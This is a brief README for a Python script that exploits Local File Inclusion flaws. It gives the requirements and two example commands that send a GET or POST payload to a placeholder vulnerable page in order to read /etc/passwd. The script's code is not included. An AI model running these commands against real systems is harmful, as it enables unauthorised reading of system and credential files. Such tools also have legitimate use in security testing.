# LFI Exploit Script

A simple Python script to exploit Local File Inclusion (LFI) vulnerabilities using GET or POST requests.

## Usage

The script sends an LFI payload to a vulnerable URL with a specified parameter.

### Requirements
- Python 3.11+
- `requests` library (install via `pip install requests`)
- `paramiko` library (install via `pip install paramiko`)

### Running the script

#### POST request (default)
```bash
python lfi.py http://example.com/vuln_page.php param /etc/passwd POST
```

#### GET reqeust
```bash
python lfi.py http://example.com/vuln_page.php param /etc/passwd GET
```
